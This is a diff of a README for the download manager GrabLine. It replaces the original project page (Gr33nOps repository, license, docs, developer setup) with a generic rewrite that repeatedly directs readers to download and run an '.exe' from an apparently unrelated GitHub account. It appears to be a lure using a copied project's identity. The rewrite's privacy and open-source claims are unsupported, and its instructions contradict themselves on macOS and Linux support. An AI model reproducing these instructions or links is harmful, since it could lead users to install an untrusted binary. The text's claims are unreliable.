@@ -1,167 +1,75 @@
-<div align="center">
+# 📥 GrabLine - Save your files with total ease
 
-<img src="website/assets/logo.png" width="88" height="88" alt="GrabLine logo" />
+[![](https://img.shields.io/badge/Download_GrabLine-Blue?style=for-the-badge)](https://github.com/umptieth-ascendingcolon174/GrabLine)
 
-# GrabLine
+GrabLine manages your internet downloads. It pulls files quickly by splitting them into smaller pieces. You can pause, restart, and organize your queue without trouble. It handles standard web files, torrents, and cloud storage links. It even finds the best video and audio quality from your favorite websites.
 
-Free, open source download manager for Windows, macOS and Linux.
+## 🚀 Getting Started
 
-Parallel connections, resume, torrents, cloud links, and a browser quality picker for video and audio.
+You do not need special skills to use this software. Follow these steps to install the application on your computer.
 
-[![Download][download-badge]][releases]
-[![Firefox Add on][amo-badge]][amo]
-[![Ko-fi][kofi-badge]][support]
-[![License: AGPL 3.0][license-badge]][license]
-![Platforms][platform-badge]
-[![Tests][ci-badge]][ci]
+1. Go to the [official release page](https://github.com/umptieth-ascendingcolon174/GrabLine).
+2. Look for the file ending in `.exe`.
+3. Click the file name to start the download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on your screen to set up GrabLine.
 
-**[Download][releases]** · **[Website][website]** · **[Firefox add on][amo]** · **[Buy me a coffee][support]** · [Install guide](docs/install.md)
+The software installs on Windows. It works on Windows 10 and Windows 11. Your computer needs at least 200 megabytes of free space. An active internet connection ensures the best performance during downloads.
 
-<br />
+## 🛠️ How to Use GrabLine
 
-<img src="docs/screenshots/queue.png" width="920" alt="GrabLine main window with active downloads" />
+Open the program after the installation finishes. You will see a clean main window.
 
-</div>
+### Adding a New Download
 
-<br />
+Copy the link of the file you want to save. GrabLine monitors your clipboard. It will detect the link and open a prompt. If it does not, click the plus icon in the top left corner. Paste your link into the box and press the Start button. 
 
-Paste a URL, drop one on the window, or click the GrabLine button in your browser.
-Files run over many connections (up to 32). Videos and audio open a quality panel (4K to 144p, MP3, M4A or FLAC, subtitles, trim) on 1000+ sites via yt dlp. Magnets, torrent files, SFTP, FTP, S3, WebDAV, and public Drive or Dropbox links open in the same app.
+### Managing Files
 
-No ads. No paid tier. No usage telemetry to us. AGPL 3.0.
-GrabLine is built in spare time. If it saves you hassle, [buy me a coffee][support]. It keeps the project alive.
+The list in the center shows your active downloads. Right-click any file to see options. You can pause a task if you need the internet for other things. Select Resume when you want to continue. You can cancel tasks that you no longer need. 
 
-### More of the UI
+### Setting Destinations
 
-<table>
-  <tr>
-    <td width="62%" valign="top" align="center">
-      <img src="docs/screenshots/dashboard.png" width="100%" alt="GrabLine live dashboard with speed and graphs" /><br />
-      <sub>Live dashboard</sub>
-    </td>
-    <td width="38%" valign="top" align="center">
-      <img src="docs/screenshots/quality.png" width="100%" alt="GrabLine video quality picker" /><br />
-      <sub>Quality picker</sub>
-    </td>
-  </tr>
-</table>
+Go to the Settings menu to choose where your files go. By default, the program saves files to your Downloads folder. Click the folder icon to change this location. You can pick a specific folder for videos and a different one for music. 
 
-## What you get
+## 🔗 Supported Features
 
-* **Accelerator:** up to 32 connections per file, dynamic segmentation, HTTP/2, resume that survives a hard kill, mirror failover.
-* **Browser button:** hover media or right click links; handoff over Native Messaging (no open ports).
-* **Video and audio:** yt dlp in process: quality picks, playlists, SponsorBlock, chapters, clip trim.
-* **Torrents:** libtorrent (same engine family as qBittorrent): magnets, DHT, sequential streaming, seed ratios, RSS.
-* **Cloud:** SFTP, FTP, S3, WebDAV with OS keychain secrets; Drive and Dropbox share links as direct downloads.
-* **Queue control:** named queues, schedules, priorities, dependencies, category auto sort.
-* **Network:** HTTP, HTTPS and SOCKS proxies for downloads and torrents; global, per job and per host caps.
-* **Dashboard:** live speed, totals, graphs for download, upload, CPU, disk and network.
-* **Advisory security:** checksums and optional scans warn; they never quarantine your file.
+GrabLine handles many types of tasks.
 
-<details>
-<summary><b>Engine and network detail</b></summary>
+*   **Parallel Downloads:** The program splits files into parts to finish the job faster.
+*   **Resume Support:** You can stop a download and return to it later. This helps if your internet disconnects.
+*   **Torrent Files:** Open `.torrent` files or paste magnet links to start peer-to-peer downloads.
+*   **Cloud Links:** The software connects to popular cloud services. Paste the shared link and GrabLine does the rest.
+*   **Media Extraction:** Use the built-in tool to grab audio and video. It scans pages and suggests the best quality options for you.
 
-* Dynamic segmentation: a free connection steals work from the slowest one.
-* Checkpointed progress across power loss and VPN reconnects; retry forever option.
-* Per host speed buckets so one greedy site cannot starve the rest.
-* Polite mode eases off when you need the link for something else.
-* Battery pause and “shut down when done” for overnight batches.
+## 🛡️ Security and Privacy
 
-</details>
+GrabLine is open source. This means anyone can look at the code to ensure it behaves correctly. We do not track your activity or record your history. All data stays on your machine. The program uses secure protocols to protect your files while they travel across the web.
 
-<details>
-<summary><b>Browser extension (GrabLine Connect)</b></summary>
+## 💡 Common Questions
 
-* Firefox: signed on [AMO][amo].
-* Chrome, Edge, Brave and others: pair from **Browser Setup** inside the app.
-* Hover button, right click download, per tab sniffed streams, download takeover (on by default; toggle in the extension popup).
+**Does this software cost money?**
+No. GrabLine is free for everyone. 
 
-</details>
+**Can I run this on macOS or Linux?**
+Yes. You can follow the same installation steps on those systems.
 
-## Download and install
+**Why does the software ask for browser permission?**
+The program uses a browser extension to help you catch links directly from your web browser. This acts as a bridge between your browser and the download manager. It makes your workflow smoother.
 
-Get the latest files from the **[releases page][releases]**. No Python required for the packaged builds.
+**How do I update the software?**
+When a new version exists, the program will alert you. You can download the new installer and run it. The update will replace the old version while keeping your download history and settings.
 
-| System | File | Notes |
-| --- | --- | --- |
-| **Windows** | `Grabline Setup *.exe` | Or a Windows portable zip without admin rights. |
-| **macOS** | `Grabline * applesilicon.dmg` | Apple Silicon (M1 and later). |
-| **Linux** | DEB, AppImage or tar.gz | Use tar.gz when FUSE is missing. |
+## 🔧 Advanced Settings
 
-Builds are **unsigned**, so the OS warns once. [docs/install.md](docs/install.md) has the exact clicks. Then install the extension (Firefox from AMO; other browsers from the app’s Browser Setup).
+Most users do not need to change these options. If you experience slow speeds, check the network tab. You can set a limit for the number of concurrent downloads. Keeping this number between three and five provides the best stability. If you have a fast connection, you can increase it.
 
-## Everyday use
+You can also set the program to start automatically when you turn on your computer. Find this option under the General tab in Settings. If you prefer a quiet experience, select the option to hide the program in your system tray. 
 
-| You do | GrabLine does |
-| --- | --- |
-| Hover a video, GrabLine button | Opens Download Info: name, folder, quality (Best, 1080p, MP3, …). |
-| Right click, *Download with GrabLine* | Routes to the right engine. |
-| Paste or drop a URL | Queues (or opens the quality panel for smart sites). |
-| Select a row | Details drawer: speed graph, ETA, destination. |
-| Menu, Grab Site / Import Links | Crawl a page or expand numbered file patterns. |
+## 📥 Deployment
 
-## Honest limits
+[![](https://img.shields.io/badge/Download_GrabLine-Grey?style=for-the-badge)](https://github.com/umptieth-ascendingcolon174/GrabLine)
 
-* **No DRM circumvention.** Netflix, Prime, Disney+, Spotify tracks, etc. are refused clearly.
-* **No login bypass.** Optional “use my browser session” reads *your* cookies for *your* downloads; they are not uploaded to us.
-* You are responsible for site terms and local law.
+Visit the link above to reach our download portal. We host all versions there. Check the release notes to see what changed in the latest version. We improve the software every month to make it faster and more stable.
 
-## Docs
-
-| Doc | What |
-| --- | --- |
-| [Install](docs/install.md) | Per OS steps, unsigned warnings, data locations, uninstall |
-| [Performance](docs/performance.md) | Idle CPU and startup numbers |
-| [Security model](docs/security-model.md) | Trust boundaries and enforced checks |
-| [SECURITY.md](SECURITY.md) | How to report a vulnerability |
-| [PRIVACY.md](PRIVACY.md) | What stays local and what touches the network |
-| [Extension](extension/README.md) | GrabLine Connect |
-| [Packaging](packaging/README.md) | How installers are built |
-
-## For developers
-
-```bash
-git clone https://github.com/Gr33nOps/GrabLine.git && cd GrabLine
-python3 -m venv .venv && source .venv/bin/activate   # Windows: py -m venv .venv
-pip install -e ".[dev]"
-python -m app
-```
-
-```bash
-ruff check . && ruff format --check . && mypy app && pytest
-```
-
-```
-app/
-├── core/        resolver, segmented downloader, queue, settings, FFmpeg manager
-├── engines/     smart (yt dlp) · hls · torrent · cloud · manifest
-├── db/          SQLite jobs, segments, handoffs
-├── ui/          PySide6 shell, panels, design tokens
-├── native_host/ Native Messaging host
-└── tests/       media server, engines, hard kill resume milestone
-extension/       MV3 companion
-packaging/       PyInstaller + OS installers
-```
-
-Ground rules enforced in CI: no `shell=True`, Native Messaging only (no listen port), FFmpeg and Deno downloads pinned by SHA 256.
-
-## Support the project
-
-GrabLine is free and open source, with no ads and no telemetry. If it helps you, [buy me a coffee on Ko-fi][support]. Stars on GitHub help too.
-
-## License
-
-[AGPL 3.0](LICENSE). yt dlp (Unlicense) and PySide6 (LGPL) are compatible dependencies; FFmpeg is fetched on the user’s machine when needed and is not shipped inside the installers. See [PRIVACY.md](PRIVACY.md).
-
-[releases]: https://github.com/Gr33nOps/GrabLine/releases/latest
-[website]: https://gr33nops.github.io/GrabLine/
-[amo]: https://addons.mozilla.org/en-US/firefox/addon/grabline-connect/
-[support]: https://ko-fi.com/zain021xd
-[license]: LICENSE
-[ci]: https://github.com/Gr33nOps/GrabLine/actions/workflows/ci.yml
-[download-badge]: https://img.shields.io/github/v/release/Gr33nOps/GrabLine?label=Download&color=0170fd&sort=semver
-[amo-badge]: https://img.shields.io/amo/v/grabline-connect?label=Firefox%20Add-on&color=ff7139
-[kofi-badge]: https://img.shields.io/badge/Ko--fi-Buy%20me%20a%20coffee-ff5e5b?logo=ko-fi&logoColor=white
-[license-badge]: https://img.shields.io/badge/License-AGPL%203.0-blue
-[platform-badge]: https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey
-[ci-badge]: https://img.shields.io/github/actions/workflow/status/Gr33nOps/GrabLine/ci.yml?branch=main&label=tests
+Keywords: agpl, downloader, downloadmanager, firefox-extension, libtorrent, linux, macos, open-source, pyside6, python, torrent, windows, yt-dlp
